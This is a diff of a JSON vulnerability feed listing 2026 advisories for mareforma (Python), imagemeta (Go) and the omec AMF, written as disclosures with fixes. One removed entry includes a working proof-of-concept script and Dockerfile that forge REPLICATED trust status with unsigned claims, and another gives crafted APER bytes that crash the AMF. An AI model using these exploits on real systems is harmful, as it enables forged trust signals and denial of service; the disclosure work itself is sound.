-      "summary": "### Summary\n\n`mareforma` 0.3.3 contains a critical integrity flaw in the REPLICATED convergence logic (`_maybe_update_replicated_unlocked()` in `mareforma/db/core.py:1300-1319`). The peer-selection SQL query that determines whether two independent claims \"agree\" on the same anchor does not verify that either claim carries a valid cryptographic signature from an enrolled validator key. Because `rekor_enabled=False` is the default and automatically sets `transparency_logged=1` at insert time, every claim — signed or not — immediately satisfies the convergence precondition. An attacker with no Mareforma key can write an unsigned claim to a shared graph, cause it to converge with a legitimate signed peer claim, and have it promoted to `REPLICATED` status. The forged `REPLICATED` row is then returned by the default trust query (`graph.query(min_support=\"REPLICATED\")`), allowing the attacker to inject false trust signals into any downstream consumer relying on `REPLICATED` as a multi-party endorsement guarantee.\n\n### Details\n\n**Root cause — `mareforma/db/core.py:1300-1319`**\n\nThe convergence function `_maybe_update_replicated_unlocked()` selects peer claims using a SQL query that filters on `status`, `unresolved`, `transparency_logged`, and `artifact_hash`, but contains no predicate on `signature_bundle` or enrolled-key identity:\n\n```python\n# mareforma/db/core.py:1300-1319\nrows = conn.execute(\n    f\"\"\"\n    SELECT DISTINCT c.claim_id, c.generated_by\n    FROM claims c, json_each(c.supports_json) j\n    WHERE j.value IN ({placeholders})\n      AND c.claim_id != ?\n      AND c.generated_by != ?\n      AND c.support_level != 'ESTABLISHED'\n      AND c.status = 'open'\n      AND c.unresolved = 0\n      AND c.transparency_logged = 1\n      AND (\n          c.artifact_hash IS NULL\n          OR ? IS NULL\n          OR c.artifact_hash = ?\n      )\n    \"\"\",\n```\n\nOnce peer rows are collected, the sink at `core.py:1324-1334` promotes all matching claim IDs — including the attacker's — to `REPLICATED` without any additional validation.\n\n**Why the preconditions are trivially satisfied**\n\n1. **`transparency_logged = 1` is set automatically.** When `rekor_enabled=False` (the library default), `core.py:1061` sets `transparency_logged = 1` immediately after insert. There is no Rekor step, so every claim becomes convergence-eligible the moment it is written.\n2. **`require_signed=False` is the default.** `mareforma/__init__.py:41` defaults `require_signed` to `False`. When the attacker opens the graph with a non-existent key path, `__init__.py:132-138` silently sets `signer = None`, enabling unsigned claim insertion.\n3. **`assert_claim()` performs no signature gate.** `_graph.py:284-291` only validates DOI resolution on the `supports` list before forwarding attacker-controlled fields to `_db.add_claim()` (`_graph.py:373-380`).\n\n**Why the forged claim surfaces in trust queries**\n\nThe default query path at `core.py:3647-3650` filters out only `PRELIMINARY` claims whose generator is not enrolled. Claims at `REPLICATED` status are returned unconditionally, so the unsigned forged row is indistinguishable from a legitimately converged row in any downstream consumer.\n\n**The helper that should have been called**\n\n`core.py:3661-3669` contains `_extract_signature_bundle_keyid()`, which can extract the key ID from a `signature_bundle`. This helper exists but is never invoked on the convergence path, indicating the validation was inadvertently omitted rather than a design decision.\n\n**Complete data flow (source → sink)**\n\n| Step | Location | Description |\n|------|----------|-------------|\n| 1 | `cli.py:700-739` | CLI accepts arbitrary `TEXT`, `--supports`, `--generated-by`; lines 720-723 explicitly permit unsigned graph mode |\n| 2 | `__init__.py:128-138` | Missing key file → `signer = None` (no error raised) |\n| 3 | `_graph.py:284-291` | `assert_claim()` forwards user-controlled `supports` after DOI check only |\n| 4 | `_graph.py:373-380` | Calls `_db.add_claim()` with attacker-controlled claim fields |\n| 5 | `db/core.py:1208-1214` | Post-insert convergence triggered when `unresolved == False` and `transparency_logged == 1` |\n| 6 | `db/core.py:1300-1319` | **Peer-selection SQL — no `signature_bundle` or enrolled-key check (vulnerable sink)** |\n| 7 | `db/core.py:1324-1334` | Updates peer and attacker claims to `REPLICATED` |\n| 8 | `db/core.py:3647-3650` | Default query returns `REPLICATED` rows without signature validation |\n\n### PoC\n\n**Prerequisites**\n\n```bash\npython3 -m venv /tmp/mareforma-poc\n/tmp/mareforma-poc/bin/pip install mareforma==0.3.3\n```\n\nOr run the fully self-contained Docker image:\n\n```bash\n# Build (from the repository root, with the local repo mounted under ./repo)\ndocker build -f vuln-001/Dockerfile -t mareforma-vuln001 .\n\n# Run (no network required)\ndocker run --rm --network none mareforma-vuln001\n```\n\n**Step-by-step attack**\n\n```python\n#!/usr/bin/env python3\nfrom pathlib import Path\nfrom tempfile import TemporaryDirectory\n\nimport mareforma\nfrom mareforma import signing\n\nwith TemporaryDirectory() as td:\n    root = Path(td)\n    key_path = root / \"root-key.pem\"\n\n    # Step 1: Legitimate root agent bootstraps a key and creates an ESTABLISHED anchor.\n    signing.bootstrap_key(key_path)\n    with mareforma.open(root, key_path=key_path) as g:\n        anchor = g.assert_claim(\n            \"established anchor\",\n            classification=\"DERIVED\",\n            generated_by=\"seed/root\",\n            seed=True,\n        )\n        # Step 2: Honest peer asserts a signed PRELIMINARY claim supporting the anchor.\n        honest = g.assert_claim(\n            \"same result\",\n            supports=[anchor],\n            generated_by=\"honest-agent\",\n        )\n\n    # Step 3: Attacker opens the same graph with a non-existent key path.\n    #         __init__.py:132-138 silently sets signer=None — unsigned mode.\n    attacker_key = root / \"missing-attacker-key.pem\"  # does not exist\n    with mareforma.open(root, key_path=attacker_key) as g:\n        # Step 4: Attacker inserts an unsigned claim supporting the same anchor.\n        #         Convergence fires in _maybe_update_replicated_unlocked():\n        #           - Two claims share the same ESTABLISHED anchor\n        #           - Different generated_by values\n        #           - Both have transparency_logged=1 (Rekor disabled by default)\n        #           - No signature or enrollment check performed\n        attack = g.assert_claim(\n            \"forged convergence\",\n            supports=[anchor],\n            generated_by=\"attacker-agent\",\n        )\n\n        attack_info = g.get_claim(attack)\n        print(attack_info[\"support_level\"])          # → REPLICATED\n        print(attack_info[\"signature_bundle\"] is None)  # → True (unsigned)\n\n        # Step 5: The unsigned REPLICATED claim appears in the default trust query.\n        results = g.query(min_support=\"REPLICATED\")\n        for r in results:\n            print((r[\"text\"], r[\"support_level\"],\n                   r[\"signature_bundle\"] is None, r[\"generator_enrolled\"]))\n```\n\n**Expected output**\n\n```\nREPLICATED\nTrue\n('established anchor', 'ESTABLISHED', False, True)\n('forged convergence', 'REPLICATED', True, False)   # ← unsigned, unenrolled\n('same result', 'REPLICATED', False, True)\n```\n\nThe forged claim (`signature_bundle=None`, `generator_enrolled=False`) is promoted to `REPLICATED` and returned alongside legitimately signed claims.\n\n**Remediation**\n\nThe convergence path must require both the incoming claim and every selected peer claim to carry a valid `signature_bundle` signed by a distinct enrolled validator key:\n\n```diff\na/mareforma/db/core.py\n+++ b/mareforma/db/core.py\n@@\n-    new_status_row = conn.execute(\n-        \"SELECT status FROM claims WHERE claim_id = ?\", (new_claim_id,),\n+    new_status_row = conn.execute(\n+        \"SELECT status, signature_bundle FROM claims WHERE claim_id = ?\",\n+        (new_claim_id,),\n     ).fetchone()\n     if new_status_row is None or new_status_row[\"status\"] != \"open\":\n         return\n+    from mareforma import validators as _validators\n+    new_keyid = _extract_signature_bundle_keyid(new_status_row[\"signature_bundle\"])\n+    if new_keyid is None or not _validators.is_enrolled(conn, new_keyid):\n+        return\n@@\n-        SELECT DISTINCT c.claim_id, c.generated_by\n+        SELECT DISTINCT c.claim_id, c.generated_by, c.signature_bundle\n@@\n-    if not rows:\n+    peer_ids = []\n+    for row in rows:\n+        peer_keyid = _extract_signature_bundle_keyid(row[\"signature_bundle\"])\n+        if peer_keyid is None or peer_keyid == new_keyid:\n+            continue\n+        if not _validators.is_enrolled(conn, peer_keyid):\n+            continue\n+        peer_ids.append(row[\"claim_id\"])\n+\n+    if not peer_ids:\n         return\n \n-    peer_ids = [r[\"claim_id\"] for r in rows] + [new_claim_id]\n+    peer_ids = peer_ids + [new_claim_id]\n```\n\n### Impact\n\nThis is an **integrity bypass** vulnerability (CWE-347: Improper Verification of Cryptographic Signature). `REPLICATED` is mareforma's primary multi-party trust signal, intended to convey that at least two independent, enrolled validators have independently observed and signed the same result. By silently bypassing the signature and enrollment checks in the convergence path, the library allows any local agent — with no cryptographic credentials — to forge this trust signal.\n\n**Who is impacted:** Any user or system that queries a mareforma graph with `min_support=\"REPLICATED\"` and treats the result as evidence of multi-party validation. This includes automated pipelines, audit dashboards, policy engines, or downstream consumers that rely on `REPLICATED` status to gate trust decisions (e.g., accepting a dataset, approving a model artifact, or publishing a result).\n\nBecause the forged claim is indistinguishable from a legitimately converged claim in query results, consumers cannot detect the attack without out-of-band inspection of `signature_bundle` and `generator_enrolled` fields — fields that the library's default query interface does not surface prominently.\n\nThe vulnerability is exploitable in the default configuration: `require_signed=False`, `rekor_enabled=False`. The attack requires only local write access to a shared graph database (e.g., a shared filesystem or writable network mount) and no Mareforma key.\n\n### Reproduction artifacts\n\n#### `Dockerfile`\n\n```dockerfile\nFROM python:3.12-slim\n\nLABEL description=\"VULN-001 PoC: Unsigned Claims Promoted to REPLICATED (CWE-347)\"\nLABEL version=\"0.3.3\"\n\nWORKDIR /app\n\n# Copy the local repository and install from source\nCOPY repo /app/repo\nRUN pip install --no-cache-dir /app/repo\n\n# Copy the proof-of-concept script\nCOPY vuln-001/poc.py /app/poc.py\n\nCMD [\"python3\", \"/app/poc.py\"]\n```\n\n#### `poc.py`\n\n```python\n#!/usr/bin/env python3\n\"\"\"\nVULN-001 Proof of Concept\nTitle: Unsigned Claims Promoted to REPLICATED via Missing Signature Enforcement\nCWE-347: Improper Verification of Cryptographic Signature\nCVSS: 7.1 (High) — CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:C/C:N/I:H/A:N\n\nRoot cause:\n  _maybe_update_replicated_unlocked() in mareforma/db/core.py:1300-1319 selects\n  peer claims for convergence without checking signature_bundle or enrolled-key\n  identity. When rekor_enabled=False (the default), transparency_logged is set\n  to 1 immediately (core.py:1061), so every claim—signed or not—is eligible for\n  the convergence query. An attacker with no key can therefore write an unsigned\n  claim that converges with a legitimate signed peer claim and is promoted to\n  REPLICATED status. The forged REPLICATED row is then returned by the default\n  query path (core.py:3647-3650) that only filters unenrolled PRELIMINARY claims.\n\nAttack steps:\n  1. Honest root agent bootstraps a key; auto-enrolls as root validator on first\n     graph open; asserts an ESTABLISHED seed anchor claim.\n  2. Honest agent asserts a signed PRELIMINARY peer claim supporting the anchor.\n  3. Attacker opens the same graph WITHOUT any key (missing-key.pem does not\n     exist → signer=None per __init__.py:132-138).\n  4. Attacker asserts an unsigned PRELIMINARY claim supporting the same anchor.\n  5. Convergence fires: two claims, same ESTABLISHED anchor, different\n     generated_by, both have transparency_logged=1 (Rekor disabled).\n  6. Both claims are promoted to REPLICATED. No signature check is performed.\n  7. graph.query(min_support=\"REPLICATED\") returns the unsigned forged claim.\n\nExpected evidence (deterministic exit code 0):\n  - attack claim support_level == \"REPLICATED\"\n  - attack claim signature_bundle is None  (unsigned)\n  - attack claim generator_enrolled == False\n  - forged unsigned REPLICATED claim appears in query results\n\"\"\"\n\nimport sys\nfrom pathlib import Path\nfrom tempfile import TemporaryDirectory\n\nimport mareforma\nfrom mareforma import signing\n\nSEPARATOR = \"-\" * 70\n\ndef banner(msg: str) -> None:\n    print(f\"\\n{SEPARATOR}\")\n    print(f\"  {msg}\")\n    print(SEPARATOR)\n\ndef main() -> int:\n    print(\"VULN-001 PoC — Unsigned Claims Promoted to REPLICATED (CWE-347)\")\n    print(f\"mareforma version: {mareforma.__version__}\")\n\n    with TemporaryDirectory() as td:\n        root = Path(td)\n        key_path = root / \"root-key.pem\"\n\n        # ------------------------------------------------------------------\n        # Step 1: Bootstrap a key for the legitimate root agent.\n        #         On first graph open, this key auto-enrolls as the root\n        #         validator, which is required for seed=True.\n        # ------------------------------------------------------------------\n        banner(\"Step 1: Bootstrap signing key for honest root agent\")\n        signing.bootstrap_key(key_path)\n        print(f\"  Key path : {key_path}\")\n        print(f\"  Exists   : {key_path.exists()}\")\n\n        # ------------------------------------------------------------------\n        # Step 2: Honest root agent creates an ESTABLISHED anchor.\n        #         Uses seed=True, which requires an enrolled validator.\n        #         The first open() with a fresh key auto-enrolls it.\n        # ------------------------------------------------------------------\n        banner(\"Step 2: Honest root agent — create ESTABLISHED anchor + signed peer claim\")\n        with mareforma.open(root, key_path=key_path) as g:\n            anchor = g.assert_claim(\n                \"established anchor\",\n                classification=\"DERIVED\",\n                generated_by=\"seed/root\",\n                seed=True,\n            )\n            anchor_info = g.get_claim(anchor)\n            print(f\"  anchor claim_id     : {anchor}\")\n            print(f\"  anchor support_level: {anchor_info['support_level']}\")\n            assert anchor_info[\"support_level\"] == \"ESTABLISHED\", (\n                f\"Unexpected anchor level: {anchor_info['support_level']}\"\n            )\n\n            # Honest agent adds a signed peer claim supporting the anchor.\n            honest = g.assert_claim(\n                \"same result\",\n                supports=[anchor],\n                generated_by=\"honest-agent\",\n            )\n            honest_info = g.get_claim(honest)\n            print(f\"  honest claim_id     : {honest}\")\n            print(f\"  honest support_level: {honest_info['support_level']}\")\n            print(f\"  honest signed       : {honest_info['signature_bundle'] is not None}\")\n\n        # ------------------------------------------------------------------\n        # Step 3: Attacker opens the graph with a non-existent key.\n        #         __init__.py:132-138: missing file → signer=None (unsigned mode).\n        # ------------------------------------------------------------------\n        banner(\"Step 3: Attacker opens graph WITHOUT a key — unsigned mode\")\n        attacker_key = root / \"missing-attacker-key.pem\"\n        print(f\"  Attacker key path: {attacker_key}\")\n        print(f\"  Attacker key exists: {attacker_key.exists()}  (intentionally absent)\")\n\n        with mareforma.open(root, key_path=attacker_key) as g:\n            # Step 4: Attacker asserts an unsigned claim with the same anchor.\n            #         Convergence logic fires: two claims, same ESTABLISHED\n            #         anchor, different generated_by, both transparency_logged=1.\n            banner(\"Step 4: Attacker inserts UNSIGNED claim — triggers convergence\")\n            attack = g.assert_claim(\n                \"forged convergence\",\n                supports=[anchor],\n                generated_by=\"attacker-agent\",\n            )\n\n            attack_info = g.get_claim(attack)\n            attack_support_level = attack_info[\"support_level\"]\n            attack_unsigned = attack_info[\"signature_bundle\"] is None\n            attack_enrolled = attack_info.get(\"generator_enrolled\", False)\n\n            print(f\"  attack claim_id       : {attack}\")\n            print(f\"  attack support_level  : {attack_support_level}\")\n            print(f\"  attack unsigned       : {attack_unsigned}  (signature_bundle is None)\")\n            print(f\"  attack enrolled       : {attack_enrolled}\")\n\n            # Step 5: Verify the unsigned REPLICATED claim appears in the\n            #         default query that consumers rely on for trust decisions.\n            banner(\"Step 5: Query min_support='REPLICATED' — should include forged claim\")\n            results = g.query(min_support=\"REPLICATED\")\n            print(f\"  Total REPLICATED results: {len(results)}\")\n            forged_in_results = False\n            for r in results:\n                is_forged = (\n                    r[\"signature_bundle\"] is None\n                    and r.get(\"generator_enrolled\") is False\n                    and r[\"support_level\"] == \"REPLICATED\"\n                )\n                marker = \"  [FORGED]\" if is_forged else \"         \"\n                print(\n                    f\"{marker} text={r['text']!r:30s} \"\n                    f\"level={r['support_level']:12s} \"\n                    f\"unsigned={r['signature_bundle'] is None!s:5s} \"\n                    f\"enrolled={r.get('generator_enrolled', '?')}\"\n                )\n                if is_forged:\n                    forged_in_results = True\n\n        # ------------------------------------------------------------------\n        # Verdict\n        # ------------------------------------------------------------------\n        banner(\"Verdict\")\n        conditions = {\n            \"attack claim support_level == REPLICATED\": attack_support_level == \"REPLICATED\",\n            \"attack claim is UNSIGNED (signature_bundle is None)\": attack_unsigned,\n            \"attack generator_enrolled == False\": attack_enrolled is False,\n            \"forged REPLICATED claim visible in query results\": forged_in_results,\n        }\n        all_pass = True\n        for desc, result in conditions.items():\n            status = \"PASS\" if result else \"FAIL\"\n            print(f\"  [{status}] {desc}\")\n            if not result:\n                all_pass = False\n\n        if all_pass:\n            print(\n                \"\\n  [CONFIRMED] VULN-001: unsigned claim promoted to REPLICATED.\\n\"\n                \"  An attacker without any key can forge graph trust.\\n\"\n                \"  The convergence path (core.py:1300-1319) does not check\\n\"\n                \"  signature_bundle or enrolled-key identity.\"\n            )\n            return 0\n        else:\n            print(\n                \"\\n  [NOT TRIGGERED] One or more conditions failed.\\n\"\n                \"  Vulnerability may have been patched or env differs.\"\n            )\n            return 1\n\nif __name__ == \"__main__\":\n    sys.exit(main())\n```",
-      "cvssScore": 7.1,
+      "id": "CVE-2026-103025",
+      "summary": "A crafted PNG can make `imagemeta.Decode` allocate memory far in excess of the input file's size, leading to memory exhaustion. Two separate paths in the `zTXt` \"Raw profile type iptc\" branch are affected: the declared chunk length drives an allocation directly, and the embedded zlib stream is decompressed without an output bound. A 42-byte file allocated 256 MB, and a 127 KB file allocated 460 MB.\n\n### Impact\n\nDenial of service by memory exhaustion against any application that decodes untrusted PNG images with this library. The decompression bomb is the more reliable vector, since it produces genuinely resident memory; the effect of the oversized `make` depends on the platform's overcommit behavior and any configured `GOMEMLIMIT` or cgroup limit.\n\n### Patches\n\nFixed in v0.17.3. \n\n### Workarounds\n\nReject or bound PNG input size before calling `Decode`, or clear `IPTC` from `Options.Sources` if IPTC metadata is not required.\n\n### Credits\n\nReported by Arpit Jain ([@arpitjain099](https://github.com/arpitjain099)).",
+      "cvssScore": 8.7,
       "severity": "High",
-      "published": "2026-11-19",
-      "modified": "2026-11-19",
+      "published": "2026-11-20",
+      "modified": "2026-11-20",
       "cwe": {
-        "cwe_id": "CWE-347",
-        "name": "Improper Verification of Cryptographic Signature"
+        "cwe_id": "CWE-409",
+        "name": "Improper Handling of Highly Compressed Data (Data Amplification)"
       },
       "references": [
-        "https://github.com/mareforma/mareforma/security/advisories/GHSA-8776-qf3h-26r3",
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-71535",
-        "https://github.com/mareforma/mareforma/pull/18",
-        "https://github.com/mareforma/mareforma/commit/e1bf09e515693a7f2a2a80852b05fa66be44302e",
-        "https://github.com/mareforma/mareforma/releases/tag/v0.3.7"
+        "https://github.com/bep/imagemeta/security/advisories/GHSA-7hvw-3c2q-45qg",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-103025",
+        "https://github.com/bep/imagemeta/pull/69",
+        "https://github.com/bep/imagemeta/commit/2289fdf83fcd238d86f72e65c588da687c998437",
+        "https://github.com/bep/imagemeta/releases/tag/v0.17.3"
       ],
       "vulnerableProducts": [
-        "mareforma pip"
+        "github.com/bep/imagemeta go"
       ],
       "isExploited": false
     },
     {
-      "id": "CVE-2026-71534",
-      "summary": "## What's wrong\n\nDuring restore, `transparency_logged` is recomputed as `1 if (toml_logged is not False and bundle_has_rekor) else 0`, where `bundle_has_rekor` comes only from a `rekor.uuid` field inside `signature_bundle`. That derivation is wrong in both directions.\n\nFirst, the rekor block is metadata attached after signing (`attach_rekor_entry` in `mareforma/signing/rekor.py` leaves the payload and signatures untouched), so it is not covered by the Ed25519 signature. A hand-edited `claims.toml` can add `\"rekor\": {\"uuid\": \"x\"}` to any claim's bundle and forge the \"publicly witnessed by Rekor\" state. The claim signature still verifies, and restore never cross-checks the block against `[rekor_inclusions]` or the log. Tampering with `claims.toml` is the exact threat model restore defends against; `_verify_claim_signatures_on_restore` checks only payload and signatures.\n\nSecond, a signed claim in a graph that never used Rekor is written with `transparency_logged=1` (the column default when Rekor is disabled) but restores as 0 because its bundle has no rekor block. The convergence gate requires `transparency_logged = 1`, so post-restore peers can no longer converge to REPLICATED. With no `rekor_url` configured, `refresh_unsigned()` is a no-op and the flag stays 0 forever. Observed on the honest path: signed non-Rekor claim restores from `transparency_logged=1` to 0, and a subsequent peer stays at PRELIMINARY instead of converging.\n\n## Severity and impact\n\n**High.** An attacker who edits `claims.toml` can mark claims Rekor-witnessed and REPLICATED-eligible without them ever having been logged. Meanwhile the common honest configuration (signed, no Rekor) has its trust state silently degraded by every catastrophic-loss restore, with no recovery path.\n\n## Location\n\n- `mareforma/db/restore.py:376` reads `toml_logged` from the TOML and probes the bundle for a `rekor.uuid`\n- `mareforma/db/restore.py:385` computes `resolved_transparency` from the unsigned rekor block alone\n- `mareforma/db/core.py:1401` the REPLICATED convergence gate requires `c.transparency_logged = 1`\n\n## Fix direction\n\nDo not derive `transparency_logged` from an unsigned envelope field. When a rekor block is present, require a matching, cryptographically verified `[rekor_inclusions]` entry (via `verify_rekor_inclusion` against the pinned log public key) whose hashedrekord `spec.data.hash` equals the SHA-256 of the claim's signed payload before setting 1; otherwise set 0.\n\nWhen the claim is signed and neither the bundle nor the graph carries Rekor coordinates, restore the write-time value: the TOML omits `transparency_logged` unless it was 0, so treat an absent flag plus no rekor bundle as 1 (the column default for non-Rekor writes).\n\nDo red/green TDD: add a regression test that fails on `main`, then make it pass.\n\n## Quality bar\n\nSOLID, DRY, KISS. Clean, readable, well-tested code. No new errors, warnings, or test failures; the full suite stays green on all supported Python versions.",
-      "cvssScore": 6.9,
+      "id": "CVE-2026-102945",
+      "summary": "## Summary\n\nHandlePathSwitchRequest guards the UESecurityCapabilities IE for presence but never for length, and the extensible APER type silently yields an empty bit string, so six unguarded index-zero reads panic on an unrecovered goroutine and terminate the AMF. The AMF is the control-plane entry point for a 5G core, so terminating it drops mobility management for every subscriber. Confirmed at HEAD daed5a2 (present in v3.1.5).\n\n## The defect\n\nngap/handler.go:\n\n```go\nif uESecurityCapabilities != nil {                                                                              // line 3267, PRESENCE only\n    amfUe.UESecurityCapability.SetEA1_128_5G((uESecurityCapabilities.NRencryptionAlgorithms.Value.Bytes[0] & 0x80) >> 7)   // line 3268\n    ... (five more Bytes[0] reads, lines 3269-3273)\n}\n```\n\nSix index-zero reads, all guarded only by a nil check on the containing IE. Why the bit string can be empty: the field is declared `aper:\"sizeExt,sizeLB:16,sizeUB:16\"`. Because the type is EXTENSIBLE, parseBitString DISCARDS the SIZE(16) constraint when the peer sets the extension bit, and then `if rawLength == 0 { return bitString, nil }` returns a bit string with an empty Bytes slice and NO ERROR. So the decoder hands the handler a well-formed, error-free value whose Bytes has length zero, and the handler indexes it. The length guarantee the maintainers rely on comes from an ASN.1 SIZE constraint that the encoder rules legitimately waive on the extension path.\n\n## Verification\n\nProven dynamically, not by reading. Eight crafted bytes (40 00 80 00 80 00 80 00) decode cleanly through the REAL APER decoder, and the handler's exact expression then panics with \"index out of range [0] with length 0\". Panic discipline was checked first: the NGAP receive path has NO recover() (the only recover in the package is on SendToRan, the transmit path), so this is a genuine process kill and the AMF terminates.\n\nAttacker model, stated conservatively: a rogue or compromised gNB on the N2 interface, which additionally needs one registered UE's AMF-UE-NGAP-ID. This is NOT reachable by a bare over-the-air UE; the realistic scenario is a compromised or malicious base station, the threat model N2 security exists to address.\n\n## Suggested fix\n\nCheck the length of Bytes before indexing, in all six places, and treat a short or empty bit string as a malformed IE with a PathSwitchRequestFailure rather than proceeding. More durably: since the SIZE constraint is waived on the extension path by design, no aper-decoded bit string can be assumed non-empty, so the same check is needed anywhere else a decoded bit string is indexed. Deduplicated against all eleven existing omec advisories and against hardening commit 030fe7c, which enumerated its sites and MISSED this handler.\n\n## Tooling\n\nAI assistance was used while investigating. The panic was reproduced by driving the real APER decoder with crafted bytes and then the handler's exact expression, and the absence of recover() on the receive path was verified by enumeration rather than assumed. The reporter separately confirmed the six unguarded index-zero reads behind a presence-only check at HEAD.",
+      "cvssScore": 4.9,
       "severity": "Medium",
-      "published": "2026-11-19",
-      "modified": "2026-11-19",
+      "published": "2026-11-20",
+      "modified": "2026-11-20",
       "cwe": {
-        "cwe_id": "CWE-345",
-        "name": "Insufficient Verification of Data Authenticity"
+        "cwe_id": "CWE-125",
+        "name": "Out-of-bounds Read"
       },
       "references": [
-        "https://github.com/mareforma/mareforma/security/advisories/GHSA-xfq4-8hf9-5h43",
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-71534",
-        "https://github.com/mareforma/mareforma/pull/58",
-        "https://github.com/mareforma/mareforma/commit/cccbf4eafd3c34b20b1686f12c0cad76c87566ae",
-        "https://github.com/mareforma/mareforma/releases/tag/v0.3.8"
+        "https://github.com/omec-project/amf/security/advisories/GHSA-v6w5-38cf-pcv8",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-102945",
+        "https://github.com/omec-project/amf/pull/767",
+        "https://github.com/omec-project/amf/commit/d28042aaaea0221c5ea93c3e069a1dd5e7436f4c",
+        "https://github.com/omec-project/amf/releases/tag/v3.1.6"
       ],
       "vulnerableProducts": [
-        "mareforma pip"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-71500",
-      "summary": "## What's wrong\n\n`_maybe_update_replicated_unlocked` never checks `t_invalid`, so a claim that a signed contradiction verdict has marked invalid can still climb to REPLICATED through convergence detection, and it pulls an honest peer up with it.\n\nThree gaps line up:\n\n- The new-claim short-circuit reads only `status` and `asserter_keyid` (`core.py:1339-1352`); an invalidated but still-`open` new claim passes.\n- The candidate-peer SELECT filters `status = 'open'`, `unresolved = 0`, and `transparency_logged = 1` but has no `t_invalid` predicate (`core.py:1390-1410`), so an invalidated existing claim qualifies as a convergence partner.\n- The promotion UPDATE gates only on `status = 'open'` (`core.py:1422-1426`), leaving a TOCTOU window even after the SELECT is fixed.\n\nA signed contradiction verdict is meant to be terminal for the trust ladder: `validate_claim` refuses to promote a `t_invalid` claim to ESTABLISHED, and `record_replication_verdict` already gates its promotion UPDATE on `t_invalid IS NULL`. Convergence promotion is the one path that ignores the verdict. Reproduced at runtime: contradict claim X (t_invalid set, still PRELIMINARY), then assert peer Y sharing X's ESTABLISHED anchor; both X and Y land at REPLICATED, with X's `t_invalid` still set.\n\n## Severity and impact\n\n**High.** A refuted claim re-enters the trust ladder at REPLICATED after its contradiction, and it serves as the corroborating peer that promotes an honest claim. Both outcomes contradict the documented refutation model, and REPLICATED is the input to further validation.\n\n## Location\n\n- `mareforma/db/core.py:1339` new-claim short-circuit checks `status` and `asserter_keyid` but not `t_invalid`\n- `mareforma/db/core.py:1390` candidate-peer SELECT WHERE clause has no `t_invalid IS NULL` predicate\n- `mareforma/db/core.py:1422` promotion UPDATE gates on `status = 'open'` only, reopening the window between SELECT and UPDATE\n\n## Fix direction\n\nTreat `t_invalid` the way the neighboring code already does. Extend the new-claim short-circuit to also read `t_invalid` and return when it is set. Add `AND c.t_invalid IS NULL` to the candidate-peer SELECT. Add `AND t_invalid IS NULL` to the promotion UPDATE's WHERE clause so the row-level lock closes the TOCTOU window, matching the gate `record_replication_verdict` already applies at `core.py:3539`.\n\nDo red/green TDD: add a regression test that fails on `main`, then make it pass.\n\n## Quality bar\n\nSOLID, DRY, KISS. Clean, readable, well-tested code. No new errors, warnings, or test failures; the full suite stays green on all supported Python versions.",
-      "cvssScore": 6.8,
-      "severity": "Medium",
-      "published": "2026-11-19",
-      "modified": "2026-11-19",
-      "cwe": {
-        "cwe_id": "CWE-754",
-        "name": "Improper Check for Unusual or Exceptional Conditions"
-      },
-      "references": [
-        "https://github.com/mareforma/mareforma/security/advisories/GHSA-rgg9-956j-3378",
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-71500",
-        "https://github.com/mareforma/mareforma/pull/58",
-        "https://github.com/mareforma/mareforma/commit/c9d8922132d916e4fd013890cb4e17921e00065e",
-        "https://github.com/mareforma/mareforma/releases/tag/v0.3.8"
-      ],
-      "vulnerableProducts": [
-        "mareforma pip"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-71536",
-      "summary": "## What's wrong\n\n`verify_bundle` documents that it verifies \"a bundle's DSSE envelope AND each per-claim signature\", lists \"per-claim signature failure\" among its raised errors, and promises that partial verification never surfaces \"an authenticated bundle that contains some invalid claims\" as success. The code does not do this. The JSON-LD predicate built by `JSONLDExporter._claim_node` carries no signature material (there is no `signatureBundle` field on the node), so the verify loop has nothing cryptographic to check per claim. It only re-derives each claim's canonical-statement digest from the node fields and compares it to the signed subject list:\n\n```python\nchain_input = _signing.canonical_statement({...node fields...}, node.get(\"evidence\") or {})\nexpected = hashlib.sha256(chain_input).hexdigest()\nif subjects[subject_name] != expected:\n    raise BundleVerificationError(...)\n```\n\nThat digest check is self-referential: the exporter signs both the subject digests and the predicate nodes with the same key. It confirms the bundle is internally consistent as built, not that each claim's purported asserter ever validly signed it. The existing test `test_tampered_claim_text_in_predicate_fails` asserts a \"digest mismatch\", confirming digest-only verification is the actual contract.\n\n## Severity and impact\n\n**Medium.** All trust in a bundle collapses to the single exporter key. Whoever holds it (or a malicious exporter) can emit a bundle containing claims whose asserter signatures are missing, invalid, or forged, and `verify_bundle` returns success. A relying party reading the docstring believes per-claim authenticity was verified when it was not. Security-sensitive because this is the trust boundary the SCITT-style export exists to provide.\n\n## Location\n\n- `mareforma/export_bundle.py:20` module docstring claims verification checks \"every per-claim signature inside predicate\"\n- `mareforma/export_bundle.py:183` `verify_bundle` docstring promises per-claim signature verification and a per-claim signature failure error\n- `mareforma/export_bundle.py:254` verify loop only recomputes and compares canonical-statement digests\n- `mareforma/exporters/jsonld.py:178` `_claim_node` emits no signature field, so the predicate carries nothing to verify per claim\n\n## Fix direction\n\nTwo honest options. Either export each claim's signature bundle in the JSON-LD predicate and have `verify_bundle` cryptographically verify it (including the claim_id and subject binding) against the claim's asserter or validator key, raising on the first failure as documented. Or, if per-claim verification is out of scope for the bundle format, correct the module docstring and the `verify_bundle` docstring to state exactly what is verified: the bundle-level DSSE signature plus internal subject-digest consistency, with per-claim asserter signatures explicitly not checked.\n\nDo red/green TDD: add a regression test that fails on `main`, then make it pass.\n\n## Quality bar\n\nSOLID, DRY, KISS. Clean, readable, well-tested code. No new errors, warnings, or test failures; the full suite stays green on all supported Python versions.",
-      "cvssScore": 7,
-      "severity": "High",
-      "published": "2026-11-19",
-      "modified": "2026-11-19",
-      "cwe": {
-        "cwe_id": "CWE-347",
-        "name": "Improper Verification of Cryptographic Signature"
-      },
-      "references": [
-        "https://github.com/mareforma/mareforma/security/advisories/GHSA-hxh5-gp44-rc6p",
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-71536",
-        "https://github.com/mareforma/mareforma/pull/58",
-        "https://github.com/mareforma/mareforma/commit/20caa4a5a9557a140a09a5d2c1c4a6a2124c0cc3",
